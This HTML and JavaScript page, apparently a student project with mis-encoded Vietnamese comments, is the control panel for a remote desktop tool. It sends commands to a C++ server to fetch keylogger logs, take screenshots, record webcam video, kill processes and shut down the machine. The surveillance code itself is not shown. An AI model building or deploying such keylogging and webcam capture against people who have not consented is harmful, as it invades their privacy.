<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Control Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">

    <style>
        
        :root {
            --bg-body: #241D4C;
            --bg-sidebar: #151128; 
            --bg-card: #2D2552; 
            --text-main: #FFFFFF;
            --text-muted: #A5B4FC;
            --primary: #D946EF; 
            --success: #2DD4BF;
            --danger: #FB7185;  
            --warning: #FACC15; 
            --radius: 12px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body { font-family: 'Inter', sans-serif; background-color: var(--bg-body); color: var(--text-main); height: 100vh; overflow: hidden; }

        .sidebar {
            width: 100%;
            background-color: var(--bg-sidebar);
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            padding: 20px;
            align-items: center;
            border-bottom: 1px solid #475569;
        }

        .logo {
            font-size: 25px;
            font-weight: 700;
            color: var(--primary);
            display: flex;
            gap: 10px;
            align-items: center;
            flex-direction: row-reverse;
        }
        
        .connection-box {
            background: rgba(0,0,0,0.2);
            padding: 10px;
            border-radius: var(--radius);
            border: 1px solid #475569;
            display: flex;
            align-items: center;
            gap: 5px;
            flex-direction: column;
        }

        #connectionPanel,#disconnectPanel{
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #connectStatus,#ipInput{
            width: 275px;
        }

        .connection-box input { width: 100%; background: var(--bg-body); border: 1px solid #475569; color: white; padding: 8px; border-radius: 6px; }
        
        .nav-links { display: flex; flex-direction: row; gap: 5px; }
        
        .nav-btn {
            background: transparent; border: none; color: var(--text-muted);
            padding: 10px 20px; text-align: left; cursor: pointer; border-radius: 8px;
            font-size: 15px; display: flex; align-items: center; gap: 12px; transition: 0.2s;
            width: 100%; flex-direction: column;
        }
        .nav-btn:hover { background-color: rgba(255, 255, 255, 0.05); color: var(--text-main); }
        .nav-btn.active { background-color: var(--primary); color: white; }

        /* Main Content */
        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .content-area { flex: 1; position: fixed; left: 300px; right: 300px; margin-top: 50px; overflow-y: auto; }
        
        /* Utility */
        .page { display: none; animation: fadeIn 0.3s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        h2 { margin-bottom: 20px; border-bottom: 1px solid var(--bg-card); padding-bottom: 10px; }
        .card { background: var(--bg-sidebar); border-radius: var(--radius); padding: 25px; border: 1px solid #475569; }
        .control-row { display: flex; gap: 10px; align-items: center; margin-bottom: 15px; justify-content: space-evenly;}
        input.main-input { flex: 1; background: var(--bg-body); border: 1px solid #475569; color: white; padding: 12px; border-radius: 8px; }
        
        /* Buttons */
        .action-btn { padding: 9px 15px; border-radius: 8px; border: none; cursor: pointer; color: white; background: var(--bg-card); display: flex; align-items: center; gap: 8px; font-weight: 600; }
        .btn-primary { background: var(--primary); }
        .btn-danger { background: var(--danger); font-size: 20px; display: flex; flex-direction: column; padding: 15px; }
        .btn-green { background: var(--success); font-size: 20px; display: flex; flex-direction: column; padding: 15px; }
        .btn-block { width: 100%; justify-content: center; }

        /* Terminal */
        .terminal { background: #0f172a; color: #10b981; font-family: 'JetBrains Mono', monospace; padding: 15px; border-radius: 8px; border: 1px solid #334155; min-height: 200px; max-height: 400px; overflow-y: auto; list-style: none; }
        .terminal li { margin-bottom: 5px; border-bottom: 1px solid #334155; padding-bottom: 2px; }

        /* Toast */
        #toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 1000; display: flex; flex-direction: column; gap: 10px; }
        .toast { background: var(--bg-sidebar); color: white; padding: 15px 25px; border-radius: 8px; border-left: 4px solid var(--success); display: flex; align-items: center; gap: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: slideIn 0.3s; }
        .toast.error { border-left-color: var(--danger); }
        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
    </style>
</head>
<body>

    <nav class="sidebar">
        <div class="logo"><i class="fa-solid fa-server"></i> Desktop Remote</div>
        
        <div class="connection-box">
            <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 5px;">Server IP Address</div>
            
            <div id="connectionPanel">
                <input id="ipInput" placeholder="127.0.0.1" value="127.0.0.1">
                <button id="btnConnect" class="action-btn btn-primary btn-block">
                    <i class="fa-solid fa-link"></i> Connect
                </button>
            </div>

            <div id="disconnectPanel" style="display: none;">
                <div id="connectStatus" style="font-size: 13px; word-break: break-all;">Connected</div>
                <button id="btnDisconnect" class="action-btn btn-danger btn-block" style="display: flex;flex-direction: row; padding: 5px;">
                    <i class="fa-solid fa-link-slash"></i> Disconnect
                </button>
            </div>
        </div>

        <div class="nav-links">
            <button class="nav-btn active" onclick="switchTab('application', this)"><i class="fa-solid fa-window-maximize"></i> Apps</button>
            <button class="nav-btn" onclick="switchTab('process', this)"><i class="fa-solid fa-microchip"></i> Processes</button>
            <button class="nav-btn" onclick="switchTab('keylogger', this)"><i class="fa-regular fa-keyboard"></i> Keylogger</button>
            <button class="nav-btn" onclick="switchTab('screenshot', this)"><i class="fa-regular fa-keyboard"></i> Screenshot</button>
            <button class="nav-btn" onclick="switchTab('webcam', this)"><i class="fa-solid fa-camera"></i> Webcam</button>
            <button class="nav-btn" onclick="switchTab('system', this)"><i class="fa-solid fa-power-off"></i> System</button>
        </div>
    </nav>

    <div class="main-content">
        <div class="content-area">

            <div id="application" class="page active">
                <h2>Application Manager</h2>
                <div class="card">
                    <div class="control-row">
                        <input id="appName" class="main-input" placeholder="Enter app name (notepad, calc, chrome...)">
                        <button onclick="sendCommand('startApp')" class="action-btn btn-green" style="flex-direction: row; padding: 10px;" ><i class="fa-solid fa-play"> </i> Start</button>
                        <button onclick="sendCommand('stopApp')" class="action-btn btn-danger" style="flex-direction: row; padding: 10px;"><i class="fa-solid fa-stop"></i> Stop</button>
                    </div>
                    <div class="control-row">
                        <button onclick="sendCommand('listApp')" class="action-btn"><i class="fa-solid fa-rotate"></i> Refresh List</button>
                    </div>
                    <ul id="appList" class="terminal">
                        <li style="color: #64748b">Click Refresh to load apps...</li>
                    </ul>
                </div>
            </div>

            <div id="process" class="page">
                <h2>Process Manager</h2>
                <div class="card">
                    <div class="control-row">
                        <input id="processName" class="main-input" placeholder="Enter Process Name (e.g., notepad.exe)">
                        <button onclick="sendCommand('stopProcess')" class="action-btn btn-danger" style="flex-direction: row; padding: 10px;"><i class="fa-solid fa-skull"></i> Kill Process</button>
                        <button onclick="sendCommand('listProcess')" class="action-btn" style="flex-direction: row; padding: 10px; font-size: 20px;" ><i class="fa-solid fa-list-check"></i> List All</button>
                    </div>
                    <ul id="processList" class="terminal" style="height: 500px;"></ul>
                </div>
            </div>

            <div id="keylogger" class="page">
                <h2>Keylogger View</h2>
                <div class="card">
                    <div class="control-row">
                        <button onclick="sendCommand('getKeylog')" class="action-btn btn-primary" style="display: flex; flex-direction: row; padding: 15px; font-size: 20px;"><i class="fa-solid fa-download"></i> Fetch Logs</button>
                    </div>
                    <div id="keylogResult" class="terminal" style="color: #fbbf24; white-space: pre-wrap;">No data fetched yet.</div>
                </div>
            </div>

            <div id="screenshot" class="page">
                <h2>Screenshot</h2>
                <div class="card"  style="display: flex; justify-content: space-around;">
                    <button onclick="sendCommand('screenshot')" class="action-btn" style="background: #e67e22; display: flex; flex-direction: column; padding: 30px; font-size: 20px;">
                            <i class="fa-solid fa-camera"></i> Screenshot
                    </button>
                </div>
            </div>
            <div id="webcam" class="page">
                <h2>Webcam view</h2>
                    <div class="card">
                    <div class="control-row">

                        <button onclick="startOnWebcam()" class="action-btn btn-green">
                            <i class="fa-solid fa-eye"></i> B·∫≠t Camera
                        </button>
                        <button onclick="stopOnWebcam()" class="action-btn btn-danger">
                            <i class="fa-solid fa-eye-slash"></i> T·∫Øt Camera
                        </button>

                        <input id="recSeconds" type="number" value="5" placeholder="S·ªë gi√¢y quay">
                        <button onclick="sendCommand('recordVideo')" class="action-btn btn-primary">
                            <i class="fa-solid fa-video"></i> Quay & L∆∞u
                        </button>
                    </div>
                    <div id="onWebcamContainer" style="background: black; min-height: 300px; display: flex; align-items: center; justify-content: center; border-radius: 8px;">
                        <span style="color: #64748b;">M√†n h√¨nh Camera</span>
                    </div>
                </div>

                <div class="card">
                    <div id="recordResult" class="terminal" style="min-height: 50px;">K·∫øt qu·∫£ quay s·∫Ω hi·ªán ·ªü ƒë√¢y...</div>
                </div>

<div id="webcamResult" style="color: cyan; font-size: 13px; margin-top: 5px;"></div>
                        
                    </div>
                    <div id="mediaResult" style="margin-top:10px; color: cyan; font-size: 14px;"></div>
                    <div id="system" class="page">
                <h2>System Control</h2>
                <div class="card">
                    <p style="color: var(--text-muted); margin-bottom: 20px; align-items: center;display: flex; justify-content: space-around; "> Nguy hi·ªÉm: H√†nh ƒë·ªông n√†y s·∫Ω t·∫Øt ho·∫∑c kh·ªüi ƒë·ªông l·∫°i m√°y ch·ªß.</p>
                    <div class="control-row">
                        <button onclick="sendCommand('shutdown')" class="action-btn btn-danger"><i class="fa-solid fa-power-off"></i> Shutdown (60s)</button>
                        <button onclick="sendCommand('restart')" class="action-btn btn-warning" style="color: #0f172a; font-size: 20px; display: flex; flex-direction: column; padding: 15px; "><i class="fa-solid fa-rotate"></i> Restart (60s)</button>
                    </div>
                </div>
            </div>
                </div>
            </div>


        </div>
    </div>

    <div id="toast-container"></div>
    <script src="script.js"></script>
    <script>
        function switchTab(tabId, btn) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            btn.classList.add('active');
        };
    </script>

    <script>
    // H√†m g·ªçi API Screenshot
    function triggerScreenshot() {
        document.getElementById("mediaResult").innerText = "Taking screenshot...";
        fetch('/screenshot')
            .then(res => res.text())
            .then(data => {
                document.getElementById("mediaResult").innerText = data;
            });
    }
    </script>

    <script>
    // 1. C·∫•u h√¨nh IP Server (L·∫•y IP hi·ªán t·∫°i c·ªßa tr√¨nh duy·ªát ho·∫∑c g√°n c·ª©ng IP m√°y server)
    const IP = window.location.hostname || "127.0.0.1"; 
    const PORT = 6969;

    function showToast(message, type) {
        console.log(`[${type}] ${message}`);
    }

    // H√†m g·ª≠i d·ªØ li·ªáu xu·ªëng Server (Backend C++)
    async function postControl(data) {
        try {
            // G·ª≠i request POST ƒë·∫øn ƒë∆∞·ªùng d·∫´n /webcam
            // Server C++ s·∫Ω ƒë·ªçc body ƒë·ªÉ t√¨m "seconds"
            const response = await fetch(`http://${IP}:${PORT}/webcam`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data) 
            });
            return await response.text();
        } catch (error) {
            console.error("L·ªói k·∫øt n·ªëi:", error);
            return "Error: Kh√¥ng k·∫øt n·ªëi ƒë∆∞·ª£c Server";
        }
    }


    // 1. H√†m b·∫≠t giao di·ªán Camera (startOnWebcam)
    function startOnWebcam() {
        const container = document.getElementById('onWebcamContainer');
        if(container) {
            container.style.display = 'flex';
            container.innerHTML = '<span style="color: #4ade80;">Camera Active (Ready to Record)</span>';
        }
        showToast("Camera mode on!", "success");
    }

    // 2. H√†m t·∫Øt giao di·ªán Camera (stopOnWebcam)
    function stopOnWebcam() {
        const container = document.getElementById('onWebcamContainer');
        if(container) {
            container.innerHTML = '<span style="color: #64748b;">M√†n h√¨nh Camera (ƒê√£ t·∫Øt)</span>';
        }
        showToast("Camera mode off!", "error");
    }

    // 3. H√†m g·ª≠i l·ªánh quay (sendCommand) - Quan tr·ªçng nh·∫•t
    async function sendCommand(cmd) {
        if(cmd === 'recordVideo') {
            const secInput = document.getElementById('recSeconds');
            const sec = secInput ? secInput.value : 5; // M·∫∑c ƒë·ªãnh 5s n·∫øu kh√¥ng t√¨m th·∫•y input
            
            showToast(`üé• Recording ${sec}s...`, "info");
            
            // --- G·ª≠i l·ªánh xu·ªëng C++ ---
            // Server C++ ch·ªù l·ªánh n√†y, quay video, r·ªìi tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n file
            const path = await postControl({ command: 'recordVideo', seconds: sec });
            
            // X·ª≠ l√Ω k·∫øt qu·∫£ tr·∫£ v·ªÅ
            const resultDiv = document.getElementById('recordResult');
            
            if(path.includes("Error") || path.includes("Loi") || path.includes("404")) {
                showToast("Recording errors!", "error");
                if(resultDiv) resultDiv.innerHTML = `<div style="color:red">L·ªói: ${path}</div>`;
            } else {
                // T·∫°o URL t·∫£i v·ªÅ (Th√™m timestamp ƒë·ªÉ tr√°nh cache)
                const timestamp = new Date().getTime();
                const fullUrl = `http://${IP}:${PORT}${path}`;
                const downloadName = `Evidence_${timestamp}.avi`;

                // Hi·ªÉn th·ªã n√∫t t·∫£i v·ªÅ (V√¨ tr√¨nh duy·ªát kh√¥ng xem ƒë∆∞·ª£c AVI tr·ª±c ti·∫øp)
                if(resultDiv) {
                    resultDiv.innerHTML = `
                    <div style="background:#1e293b; padding:15px; border-radius:8px; margin-top:10px; border: 1px solid #475569;">
                        <p style="color: #cbd5e1; margin-bottom: 5px;">‚úÖ Quay th√†nh c√¥ng!</p>
                        <a href="${fullUrl}" download="${downloadName}" 
                           style="background-color: #e25ab2; color: white; padding: 8px 15px; text-decoration: none; border-radius: 5px; display: inline-block;">
                           <i class="fa-solid fa-download"></i> T·∫£i Video V·ªÅ (.avi)
                        </a>
                    </div>`;
                }
                
                showToast("ƒê√£ xong! Video ƒë√£ s·∫µn s√†ng.", "success");
            }
        }
    }
</script>
    
    </script>
</body>
</html>